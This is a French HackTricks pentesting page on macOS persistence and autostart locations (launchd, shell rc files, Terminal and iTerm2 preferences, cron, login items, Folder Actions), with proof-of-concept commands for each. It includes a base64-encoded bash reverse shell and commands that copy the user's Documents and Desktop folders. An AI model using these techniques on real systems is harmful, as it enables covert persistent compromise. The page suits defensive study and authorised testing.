# Auto-Démarrage macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Cette section est largement basée sur la série de blogs [**Au-delà des bons vieux LaunchAgents**](https://theevilbit.github.io/beyond/), le but est d'ajouter **plus d'emplacements d'auto-démarrage** (si possible), d'indiquer **les techniques qui fonctionnent encore** de nos jours avec la dernière version de macOS (13.4) et de spécifier les **autorisations** nécessaires.

## Contournement de la sandbox

{% hint style="success" %}
Ici, vous pouvez trouver des emplacements de démarrage utiles pour **contourner la sandbox** qui vous permettent simplement d'exécuter quelque chose en **l'écrivant dans un fichier** et en **attendant** une **action très courante**, une **durée déterminée** ou une **action que vous pouvez généralement effectuer** depuis l'intérieur d'une sandbox sans avoir besoin de privilèges root.
{% endhint %}

### Launchd

* Utile pour contourner la sandbox : [✅](https://emojipedia.org/check-mark-button)

#### Emplacements

* **`/Library/LaunchAgents`**
* Déclencheur : Redémarrage
* Nécessite les privilèges root
* **`/Library/LaunchDaemons`**
* Déclencheur : Redémarrage
* Nécessite les privilèges root
* **`/System/Library/LaunchAgents`**
* Déclencheur : Redémarrage
* Nécessite les privilèges root
* **`/System/Library/LaunchDaemons`**
* Déclencheur : Redémarrage
* Nécessite les privilèges root
* **`~/Library/LaunchAgents`**
* Déclencheur : Connexion
* **`~/Library/LaunchDemons`**
* Déclencheur : Connexion

#### Description et exploitation

**`launchd`** est le **premier** **processus** exécuté par le noyau OX S au démarrage et le dernier à se terminer à l'arrêt. Il devrait toujours avoir le **PID 1**. Ce processus va **lire et exécuter** les configurations indiquées dans les **plists ASEP** dans :

* `/Library/LaunchAgents` : Agents par utilisateur installés par l'administrateur
* `/Library/LaunchDaemons` : Daemons à l'échelle du système installés par l'administrateur
* `/System/Library/LaunchAgents` : Agents par utilisateur fournis par Apple.
* `/System/Library/LaunchDaemons` : Daemons à l'échelle du système fournis par Apple.

Lorsqu'un utilisateur se connecte, les plists situés dans `/Users/$USER/Library/LaunchAgents` et `/Users/$USER/Library/LaunchDemons` sont démarrés avec les **autorisations des utilisateurs connectés**.

La **principale différence entre les agents et les daemons est que les agents sont chargés lorsque l'utilisateur se connecte et les daemons sont chargés au démarrage du système** (car il y a des services comme ssh qui doivent être exécutés avant que tout utilisateur n'accède au système). De plus, les agents peuvent utiliser l'interface graphique tandis que les daemons doivent s'exécuter en arrière-plan.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Il existe des cas où un **agent doit être exécuté avant la connexion de l'utilisateur**, on les appelle des **PreLoginAgents**. Par exemple, cela est utile pour fournir une technologie d'assistance lors de la connexion. Ils peuvent également être trouvés dans `/Library/LaunchAgents` (voir [**ici**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un exemple).

{% hint style="info" %}
Les nouveaux fichiers de configuration des démons ou des agents seront **chargés après le prochain redémarrage ou en utilisant** `launchctl load <target.plist>`. Il est **également possible de charger des fichiers .plist sans cette extension** avec `launchctl -F <file>` (cependant, ces fichiers plist ne seront pas automatiquement chargés après le redémarrage).\
Il est également possible de **décharger** avec `launchctl unload <target.plist>` (le processus pointé par celui-ci sera terminé).

Pour **s'assurer** qu'il n'y a **rien** (comme une substitution) **empêchant** un **Agent** ou un **Démon** de **s'exécuter**, exécutez : `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Listez tous les agents et démons chargés par l'utilisateur actuel :
```bash
launchctl list
```
### Fichiers de démarrage du shell

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)

#### Emplacements

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv`, `~/.zprofile`**
* **Déclencheur**: Ouvrir un terminal avec zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Déclencheur**: Ouvrir un terminal avec zsh
* Nécessite les droits root
* **`~/.zlogout`**
* **Déclencheur**: Fermer un terminal avec zsh
* **`/etc/zlogout`**
* **Déclencheur**: Fermer un terminal avec zsh
* Nécessite les droits root
* Potentiellement plus dans: **`man zsh`**
* **`~/.bashrc`**
* **Déclencheur**: Ouvrir un terminal avec bash
* `/etc/profile` (n'a pas fonctionné)
* `~/.profile` (n'a pas fonctionné)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Déclencheur**: Censé être déclenché avec xterm, mais il **n'est pas installé** et même après l'installation, cette erreur est affichée: xterm: `DISPLAY is not set`

#### Description et exploitation

Les fichiers de démarrage du shell sont exécutés lorsque notre environnement shell comme `zsh` ou `bash` est en train de **démarrer**. De nos jours, macOS utilise par défaut `/bin/zsh`, et **chaque fois que nous ouvrons `Terminal` ou nous connectons en SSH** sur l'appareil, c'est l'environnement shell dans lequel nous sommes placés. `bash` et `sh` sont toujours disponibles, mais ils doivent être spécifiquement démarrés.

La page de manuel de zsh, que nous pouvons lire avec **`man zsh`**, contient une longue description des fichiers de démarrage.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Applications réouvertes

{% hint style="danger" %}
La configuration de l'exploitation indiquée et la déconnexion et la reconnexion, voire le redémarrage, n'ont pas fonctionné pour moi pour exécuter l'application. (L'application ne s'exécutait pas, peut-être qu'elle doit être en cours d'exécution lorsque ces actions sont effectuées)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)

#### Emplacement

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Déclencheur** : Redémarrage des applications réouvertes

#### Description et exploitation

Toutes les applications à réouvrir se trouvent dans le plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Ainsi, pour que les applications réouvertes lancent votre propre application, vous devez simplement **ajouter votre application à la liste**.

L'UUID peut être trouvé en listant ce répertoire ou avec `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Pour vérifier les applications qui seront réouvertes, vous pouvez exécuter :
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Pour **ajouter une application à cette liste**, vous pouvez utiliser :
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Préférences du Terminal

* Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)

#### Emplacement

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Déclencheur**: Ouvrir le Terminal

#### Description et Exploitation

Dans **`~/Library/Preferences`** sont stockées les préférences de l'utilisateur dans les applications. Certaines de ces préférences peuvent contenir une configuration pour **exécuter d'autres applications/scripts**.

Par exemple, le Terminal peut exécuter une commande au démarrage :

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Cette configuration est reflétée dans le fichier **`~/Library/Preferences/com.apple.Terminal.plist`** de la manière suivante :
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Donc, si le plist des préférences du terminal dans le système peut être écrasé, alors la fonctionnalité **`open`** peut être utilisée pour **ouvrir le terminal et exécuter cette commande**.

Vous pouvez l'ajouter depuis la ligne de commande avec :

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Scripts du Terminal

* Utiles pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)

#### Emplacement

* **N'importe où**
* **Déclencheur** : Ouvrir le Terminal

#### Description et Exploitation

Si vous créez un script **`.terminal`** et l'ouvrez, l'application **Terminal** sera automatiquement invoquée pour exécuter les commandes indiquées. Si l'application Terminal dispose de certains privilèges spéciaux (comme TCC), votre commande sera exécutée avec ces privilèges spéciaux.

Essayez avec :
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
{% hint style="danger" %}
Si le terminal dispose d'un **Accès complet au disque**, il pourra effectuer cette action (notez que la commande exécutée sera visible dans une fenêtre de terminal).
{% endhint %}

### Plugins audio

Writeup : [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup : [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

#### Emplacement

* **`/Library/Audio/Plug-Ins/HAL`**
* Nécessite les droits d'administrateur
* **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
* **`/Library/Audio/Plug-ins/Components`**
* Nécessite les droits d'administrateur
* **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
* **`~/Library/Audio/Plug-ins/Components`**
* **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
* **`/System/Library/Components`**
* Nécessite les droits d'administrateur
* **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur

#### Description

Selon les writeups précédents, il est possible de **compiler certains plugins audio** et de les charger.

### Plugins QuickLook

Writeup : [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)

#### Emplacement

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/NomApplicationIci/Contents/Library/QuickLook/`
* `~/Applications/NomApplicationIci/Contents/Library/QuickLook/`

#### Description et exploitation

Les plugins QuickLook peuvent être exécutés lorsque vous **déclenchez l'aperçu d'un fichier** (appuyez sur la barre d'espace avec le fichier sélectionné dans Finder) et qu'un **plugin prenant en charge ce type de fichier** est installé.

Il est possible de compiler votre propre plugin QuickLook, de le placer dans l'un des emplacements précédents pour le charger, puis d'aller sur un fichier pris en charge et d'appuyer sur la barre d'espace pour le déclencher.

### ~~Hooks de connexion/déconnexion~~

{% hint style="danger" %}
Cela n'a pas fonctionné pour moi, ni avec le LoginHook utilisateur ni avec le LogoutHook root.
{% endhint %}

**Writeup** : [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)

#### Emplacement

* Vous devez être en mesure d'exécuter quelque chose comme `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* `Situé dans `~/Library/Preferences/com.apple.loginwindow.plist`

Ils sont obsolètes mais peuvent être utilisés pour exécuter des commandes lorsqu'un utilisateur se connecte.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Ce paramètre est stocké dans `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Pour le supprimer :
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
L'utilisateur root est stocké dans **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Contournement conditionnel du sandbox

{% hint style="success" %}
Ici, vous pouvez trouver des emplacements de démarrage utiles pour contourner le sandbox, ce qui vous permet d'exécuter simplement quelque chose en l'écrivant dans un fichier et en vous attendant à des conditions pas super courantes comme des programmes spécifiques installés, des actions ou des environnements utilisateur "non courants".
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
* Cependant, vous devez être capable d'exécuter le binaire `crontab`
* Ou être root

#### Emplacement

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Accès en écriture directe nécessitant les droits root. Aucun accès root requis si vous pouvez exécuter `crontab <fichier>`
* **Déclencheur**: Dépend de la tâche cron

#### Description et exploitation

Listez les tâches cron de l'**utilisateur actuel** avec:
```bash
crontab -l
```
Vous pouvez également voir toutes les tâches cron des utilisateurs dans **`/usr/lib/cron/tabs/`** et **`/var/at/tabs/`** (nécessite les droits root).

Dans MacOS, plusieurs dossiers exécutant des scripts à **une certaine fréquence** peuvent être trouvés dans :
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Voici où vous pouvez trouver les **tâches cron** régulières, les **tâches at** (peu utilisées) et les **tâches périodiques** (principalement utilisées pour nettoyer les fichiers temporaires). Les tâches périodiques quotidiennes peuvent être exécutées par exemple avec : `periodic daily`.

Pour ajouter une **tâche cron utilisateur de manière programmatique**, il est possible d'utiliser :
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)

#### Emplacements

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Déclencheur**: Ouvrir iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Déclencheur**: Ouvrir iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Déclencheur**: Ouvrir iTerm

#### Description et Exploitation

Les scripts stockés dans **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** seront exécutés. Par exemple:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
Le script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** sera également exécuté:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Les préférences iTerm2 se trouvent dans **`~/Library/Preferences/com.googlecode.iterm2.plist`** et peuvent **indiquer une commande à exécuter** lorsque le terminal iTerm2 est ouvert.

Ce paramètre peut être configuré dans les paramètres iTerm2 :

<figure><img src="../.gitbook/assets/image (2) (1).png" alt="" width="563"><figcaption></figcaption></figure>

Et la commande est reflétée dans les préférences :
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Vous pouvez définir la commande à exécuter avec :

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Il est très probable qu'il existe **d'autres façons d'exploiter les préférences d'iTerm2** pour exécuter des commandes arbitraires.
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
* Mais xbar doit être installé

#### Emplacement

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Déclencheur** : Une fois que xbar est exécuté

### Hammerspoon

**Writeup** : [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)

#### Emplacement

* **`~/.hammerspoon/init.lua`**
* **Déclencheur** : Une fois que hammerspoon est exécuté

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) est un outil d'automatisation qui permet de **scripter macOS en utilisant le langage de script LUA**. Nous pouvons même intégrer du code AppleScript complet ainsi que exécuter des scripts shell.

L'application recherche un seul fichier, `~/.hammerspoon/init.lua`, et lorsque le script est démarré, il sera exécuté.
```bash
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("id > /tmp/hs.txt")
EOF
```
### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mais ssh doit être activé et utilisé

#### Emplacement

* **`~/.ssh/rc`**
* **Déclencheur**: Connexion via ssh
* **`/etc/ssh/sshrc`**
* Nécessite les droits root
* **Déclencheur**: Connexion via ssh

#### Description et Exploitation

Par défaut, sauf si `PermitUserRC no` est spécifié dans `/etc/ssh/sshd_config`, lorsque qu'un utilisateur se connecte via SSH, les scripts **`/etc/ssh/sshrc`** et **`~/.ssh/rc`** seront exécutés.

#### Description

Si le programme populaire [**xbar**](https://github.com/matryer/xbar) est installé, il est possible d'écrire un script shell dans **`~/Library/Application\ Support/xbar/plugins/`** qui sera exécuté lorsque xbar est démarré:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### **Éléments de connexion**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Utile pour contourner le bac à sable: [✅](https://emojipedia.org/check-mark-button)
* Mais vous devez exécuter `osascript` avec des arguments

#### Emplacements

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Déclencheur:** Connexion
* Charge utile d'exploitation stockée en appelant **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Déclencheur:** Connexion
* Accès root requis

#### Description

Dans Préférences Système -> Utilisateurs et groupes -> **Éléments de connexion**, vous pouvez trouver **les éléments à exécuter lorsque l'utilisateur se connecte**.\
Il est possible de les lister, d'en ajouter et d'en supprimer depuis la ligne de commande :
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Ces éléments sont stockés dans le fichier **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Les **éléments de connexion** peuvent également être indiqués en utilisant l'API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) qui stockera la configuration dans **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP en tant qu'élément de connexion

(Vérifiez la section précédente sur les éléments de connexion, ceci est une extension)

Si vous stockez un fichier **ZIP** en tant qu'**élément de connexion**, l'**`Archive Utility`** l'ouvrira et si le zip était par exemple stocké dans **`~/Library`** et contenait le dossier **`LaunchAgents/file.plist`** avec une porte dérobée, ce dossier sera créé (il ne l'est pas par défaut) et le plist sera ajouté afin que la prochaine fois que l'utilisateur se connecte, la **porte dérobée indiquée dans le plist sera exécutée**.

Une autre option serait de créer les fichiers **`.bash_profile`** et **`.zshenv`** à l'intérieur du répertoire HOME de l'utilisateur, de sorte que si le dossier LaunchAgents existe déjà, cette technique fonctionnerait toujours.

### At

Article : [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

#### Emplacement

* Besoin d'**exécuter** **`at`** et il doit être **activé**

#### **Description**

Les "tâches at" sont utilisées pour **planifier des tâches à des moments spécifiques**.\
Ces tâches diffèrent de cron en ce sens qu'**elles sont des tâches ponctuelles** qui sont supprimées après leur exécution. Cependant, elles **survivent à un redémarrage du système**, elles ne peuvent donc pas être exclues en tant que menace potentielle.

Par **défaut**, elles sont **désactivées**, mais l'utilisateur **root** peut les **activer** avec :
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Cela créera un fichier dans 1 heure :
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Vérifiez la file d'attente des tâches en utilisant `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Ci-dessus, nous pouvons voir deux tâches planifiées. Nous pouvons imprimer les détails de la tâche en utilisant `at -c NUMÉRODETÂCHE`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Si les tâches AT ne sont pas activées, les tâches créées ne seront pas exécutées.
{% endhint %}

Les **fichiers de tâche** peuvent être trouvés à `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Le nom de fichier contient la file d'attente, le numéro de tâche et l'heure à laquelle elle est programmée pour s'exécuter. Par exemple, examinons `a0001a019bdcd2`.

* `a` - c'est la file d'attente
* `0001a` - numéro de tâche en hexadécimal, `0x1a = 26`
* `019bdcd2` - heure en hexadécimal. Il représente les minutes écoulées depuis l'époque. `0x019bdcd2` est `26991826` en décimal. Si nous le multiplions par 60, nous obtenons `1619509560`, qui est `GMT: 27 avril 2021, mardi 7:46:00`.

Si nous imprimons le fichier de tâche, nous constatons qu'il contient les mêmes informations que celles obtenues avec `at -c`.

### Actions de dossier

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mais vous devez être capable d'appeler osascript avec des arguments et de configurer les actions de dossier

#### Emplacement

* **`/Library/Scripts/Folder Action Scripts`**
* Nécessite des privilèges d'administrateur
* **Déclencheur**: Accès au dossier spécifié
* **`~/Library/Scripts/Folder Action Scripts`**
* **Déclencheur**: Accès au dossier spécifié

#### Description et exploitation

Un script d'action de dossier est exécuté lorsque des éléments sont ajoutés ou supprimés dans le dossier auquel il est attaché, ou lorsque sa fenêtre est ouverte, fermée, déplacée ou redimensionnée :

* Ouvrir le dossier via l'interface utilisateur du Finder
* Ajouter un fichier au dossier (peut être fait par glisser-déposer ou même dans une invite de commande depuis un terminal)
* Supprimer un fichier du dossier (peut être fait par glisser-déposer ou même dans une invite de commande depuis un terminal)
* Naviguer hors du dossier via l'interface utilisateur

Il existe plusieurs façons de mettre en œuvre cela :

1. Utiliser le programme [Automator](https://support.apple.com/guide/automator/welcome/mac) pour créer un fichier de flux de travail d'action de dossier (.workflow) et l'installer en tant que service.
2. Clic droit sur un dossier, sélectionner `Configuration des actions de dossier...`, `Exécuter le service` et attacher manuellement un script.
3. Utiliser OSAScript pour envoyer des messages Apple Event à l'application `System Events.app` pour interroger et enregistrer de manière programmée une nouvelle `Action de dossier`.

* C'est la façon de mettre en œuvre la persistance en utilisant un script OSAScript pour envoyer des messages Apple Event à `System Events.app`

Voici le script qui sera exécuté :

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Compilez-le avec: `osacompile -l JavaScript -o folder.scpt source.js`

Ensuite, exécutez le script suivant pour activer les actions de dossier et attacher le script précédemment compilé au dossier **`/users/username/Desktop`**:
```javascript
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Exécutez le script avec: `osascript -l JavaScript /Users/username/attach.scpt`



* Voici comment implémenter cette persistance via l'interface graphique:

Voici le script qui sera exécuté:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
